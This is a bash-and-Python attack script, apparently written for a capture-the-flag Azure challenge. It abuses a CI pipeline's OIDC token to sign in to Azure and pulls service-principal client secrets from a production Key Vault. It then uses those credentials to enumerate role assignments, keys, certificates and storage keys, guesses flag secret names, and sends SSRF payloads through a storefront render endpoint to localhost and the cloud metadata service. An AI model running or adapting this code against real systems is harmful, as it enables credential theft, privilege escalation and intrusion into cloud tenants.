#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
KV_PROD="kv-tbl-prod-x3euoz"
KV_SEC="kv-tbl-sec-x3euoz"
STORAGE_ACC="sttblcilogsprodx3euoz"
UAMI_OID="f64d08c7-fde6-4553-99c8-5bf73666ee8c"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

# Get ALL SP creds from KV prod
echo "=== GET SP CREDS ==="
for SP in reporting-viewer-principal sync-service-principal cost-reader-principal; do
  RAW=$(az keyvault secret show --vault-name $KV_PROD --name $SP 2>/dev/null)
  CID=$(echo "$RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("appId",""))' 2>/dev/null)
  SEC=$(echo "$RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("clientSecret",""))' 2>/dev/null)
  export "CID_${SP//-/_}"="$CID"
  export "SEC_${SP//-/_}"="$SEC"
  echo "$SP: $CID len=${#SEC}"
done

CICD_ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv 2>/dev/null)
echo "CICD_ARM_LEN=${#CICD_ARM}"
export CICD_ARM

python3 -I << 'PYEOF'
import os, json, urllib.request, urllib.parse, urllib.error, base64, re, hmac, hashlib, datetime

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE = "https://management.azure.com"
KV_SEC = "kv-tbl-sec-x3euoz"
KV_PROD = "kv-tbl-prod-x3euoz"
STORAGE_ACC = "sttblcilogsprodx3euoz"
UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
PLATFORM_RG = "rg-tbl-platform-prod-sea"

def http(url, tok, method="GET", data=None, extra_headers=None):
    h = {"Authorization": "Bearer " + tok}
    if extra_headers: h.update(extra_headers)
    if data:
        if isinstance(data, dict): data = json.dumps(data).encode(); h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:500]
    except Exception as e:
        return 0, str(e)[:200]

def sp_tok(cid, sec, scope):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode({"client_id": cid, "client_secret": sec,
                "grant_type": "client_credentials", "scope": scope}).encode(), method="POST"), timeout=20)
        return json.loads(r.read()).get("access_token", "")
    except: return ""

CICD_ARM = os.environ.get("CICD_ARM", "")
output = []

# === 1. UAMI roles at Platform RG level (NOT sub level) ===
print("\n=== 1. UAMI roles at Platform RG level ===")
if CICD_ARM:
    # Query at RG scope - cicd-deployer has Reader here
    s, b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{UAMI_OID}%27", CICD_ARM)
    print(f"UAMI roles at Platform RG: {s}: {b[:2000]}")
    output.append(f"UAMI_RG_ROLES={s}:{b[:500]}")

    # Also check at each storage account level
    for sa in ['sttblarchiveprodx3euoz', 'sttblappcfgprodx3euoz', 'sttblbackupprodx3euoz']:
        s_sa, b_sa = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Storage/storageAccounts/{sa}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{UAMI_OID}%27", CICD_ARM)
        print(f"UAMI roles on {sa}: {s_sa}: {b_sa[:500]}")
        output.append(f"UAMI_{sa}={s_sa}:{b_sa[:200]}")

    # Check at ACR level
    s_acr, b_acr = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01", CICD_ARM)
    print(f"ACR role assignments: {s_acr}: {b_acr[:2000]}")
    output.append(f"ACR_ROLES={s_acr}:{b_acr[:500]}")

    # KV sec KEYS
    s_keys, b_keys = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/{KV_SEC}/keys?api-version=2023-07-01", CICD_ARM)
    print(f"KV sec KEYS: {s_keys}: {b_keys[:1000]}")
    output.append(f"KVSEC_KEYS={s_keys}:{b_keys[:500]}")

    # KV sec CERTIFICATES
    s_certs, b_certs = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/{KV_SEC}/certificates?api-version=2023-07-01", CICD_ARM)
    print(f"KV sec CERTIFICATES: {s_certs}: {b_certs[:1000]}")
    output.append(f"KVSEC_CERTS={s_certs}:{b_certs[:500]}")

    # KV prod KEYS & CERTS
    s_pk, b_pk = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/{KV_PROD}/keys?api-version=2023-07-01", CICD_ARM)
    print(f"KV prod KEYS: {s_pk}: {b_pk[:500]}")
    s_pc, b_pc = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/{KV_PROD}/certificates?api-version=2023-07-01", CICD_ARM)
    print(f"KV prod CERTS: {s_pc}: {b_pc[:500]}")

    # ALL role assignments at Platform RG level
    s_rg, b_rg = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()", CICD_ARM)
    print(f"\nALL Platform RG role assignments: {s_rg}")
    try:
        rg_ras = json.loads(b_rg)
        for ra in rg_ras.get("value", []):
            pid = ra.get("properties",{}).get("principalId","")
            role = ra.get("properties",{}).get("roleDefinitionId","").split("/")[-1]
            scope = ra.get("properties",{}).get("scope","").replace(f"/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}","(Platform RG)")
            ptype = ra.get("properties",{}).get("principalType","")
            print(f"  pid={pid[:12]}... role={role} scope={scope} type={ptype}")
            output.append(f"PLATFORM_RG_RA={pid}::{role}::{scope}::{ptype}")
    except: print(b_rg[:2000])

# === 2. reporting-viewer-principal role assignments ===
print("\n=== 2. reporting-viewer-principal ===")
RV_CID = os.environ.get("CID_reporting_viewer_principal", "")
RV_SEC = os.environ.get("SEC_reporting_viewer_principal", "")
RV_ARM = sp_tok(RV_CID, RV_SEC, "https://management.azure.com/.default")
RV_VAULT = sp_tok(RV_CID, RV_SEC, "https://vault.azure.net/.default")
print(f"RV ARM token len={len(RV_ARM)} vault token len={len(RV_VAULT)}")
if RV_ARM:
    # What can reporting-viewer see?
    s_sub, b_sub = http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01", RV_ARM)
    print(f"Resources (sub): {s_sub}: {b_sub[:2000]}")

    s_rg2, b_rg2 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/resources?api-version=2021-04-01", RV_ARM)
    print(f"Platform RG resources: {s_rg2}: {b_rg2[:1000]}")

    # Try to list KV sec with reporting-viewer vault token
    s_rv_kv, b_rv_kv = http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4", RV_VAULT)
    print(f"KV sec secrets (reporting-viewer vault): {s_rv_kv}: {b_rv_kv[:500]}")
    output.append(f"RV_KVSEC={s_rv_kv}:{b_rv_kv[:200]}")

    # Try storage accounts
    for sa in ['sttblarchiveprodx3euoz', 'sttblappcfgprodx3euoz']:
        s_rv_sa, b_rv_sa = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01", RV_ARM, method="POST")
        print(f"reporting-viewer listKeys on {sa}: {s_rv_sa}: {b_rv_sa[:200]}")

if RV_VAULT:
    # Direct vault reads
    for secret in ['flag', 'ctf-flag', 'platform-flag', 'flag-ctf', 'df26-flag', 'internal-flag']:
        s_s, b_s = http(f"https://{KV_SEC}.vault.azure.net/secrets/{secret}?api-version=7.4", RV_VAULT)
        print(f"RV KV sec secret '{secret}': {s_s}: {b_s[:300]}")
        if s_s == 200:
            output.append(f"FLAG_{secret}={b_s}")

# === 3. cost-reader: ARM reader on Platform RG -> try to read storefront app settings ===
print("\n=== 3. cost-reader: storefront app settings ===")
CR_CID = os.environ.get("CID_cost_reader_principal", "")
CR_SEC = os.environ.get("SEC_cost_reader_principal", "")
CR_ARM = sp_tok(CR_CID, CR_SEC, "https://management.azure.com/.default")
print(f"CR ARM token len={len(CR_ARM)}")
if CR_ARM:
    # List storefront app settings (requires Contributor, but try anyway)
    s_sf, b_sf = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01", CR_ARM, method="POST")
    print(f"Storefront app settings (cost-reader): {s_sf}: {b_sf[:500]}")

    # List all sites in Platform RG
    s_sites, b_sites = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites?api-version=2022-03-01", CR_ARM)
    print(f"All sites in Platform RG: {s_sites}: {b_sites[:2000]}")

    # Try storefront identity details
    s_id, b_id = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01", CR_ARM)
    print(f"Storefront details: {s_id}: {b_id[:2000]}")

    # List ACR role assignments (all principals)
    s_acr2, b_acr2 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01", CR_ARM)
    print(f"ACR ALL role assignments: {s_acr2}: {b_acr2[:3000]}")
    output.append(f"ACR_ALL_ROLES={s_acr2}:{b_acr2[:500]}")

# === 4. SSRF probe: access storefront internal endpoints ===
print("\n=== 4. SSRF to storefront internal endpoints ===")
STOREFRONT = "app-tbl-storefront-prod.azurewebsites.net"
FDID = "60407ff3-1c24-4875-9390-b6c9c13b0821"

def ssrf(target_url, label):
    payload = json.dumps({"url": target_url}).encode()
    req = urllib.request.Request(
        f"https://{STOREFRONT}/api/v1/reports/render",
        data=payload,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "X-Azure-FDID": FDID
        }
    )
    try:
        r = urllib.request.urlopen(req, timeout=15)
        return r.status, r.read().decode(errors="replace")[:1000]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:500]
    except Exception as ex:
        return 0, str(ex)[:200]

for target, label in [
    ("http://localhost/", "localhost:80"),
    ("http://localhost:8080/", "localhost:8080"),
    ("http://localhost:5000/", "localhost:5000"),
    ("http://127.0.0.1/api/v1/config", "config endpoint"),
    ("http://127.0.0.1/internal/flag", "internal flag"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "IMDS instance"),
]:
    s, b = ssrf(target, label)
    print(f"SSRF {label}: {s}: {b[:300]}")
    if 'DF26' in b or 'flag' in b.lower():
        output.append(f"FLAG_SSRF_{label}={b}")

print(f"\n=== OUTPUT ({len(output)} items) ===")
for o in output:
    print(o[:400])

PYEOF

echo "DONE"
